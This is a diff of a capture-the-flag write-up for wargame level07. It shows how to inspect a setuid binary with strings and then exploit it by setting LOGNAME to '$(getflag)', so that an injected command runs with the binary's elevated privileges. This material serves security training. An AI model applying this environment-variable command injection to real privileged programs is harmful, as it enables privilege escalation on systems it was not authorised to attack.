@@ -1,16 +1,19 @@
 # Level07
 ## Step by step
-- In the user `level07` home directory, there is a file
+### 1. Locate files in `level07` home directory
   ```bash
   > ls
   -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
   ```
-- The executable `level07` print the following when execute
+---
+
+### 2. Analyze the `level07` executable
+Execute the binary:
   ```
   > ./level
   level07
   ```
-- With the command `strings` we can see that the program is using `/bin/echo` `getenv` and `LOGNAME`
+Using the `strings` command to inspect the binary reveals some useful details
   ```
   > strings level07
   /lib/ld-linux.so.2
@@ -34,7 +37,15 @@
   /bin/echo %s 
   ;*2$"
   ```
-- The enviroment contains the variable `LOGNAME=level07`, so lets change it to get the flag
+The binary uses:
+- `/bin/echo`
+- The environment variable `LOGNAME`
+- The `getenv` function to retrieve the value of `LOGNAME`
+
+---
+
+### 3. Exploit the `level07` executable
+The environment contains the variable `LOGNAME=level07`. By modifying this variable to execute `getflag`, we can retrieve the flag.
   ```bash
   > export LOGNAME='$(getflag)'
   > ./level07
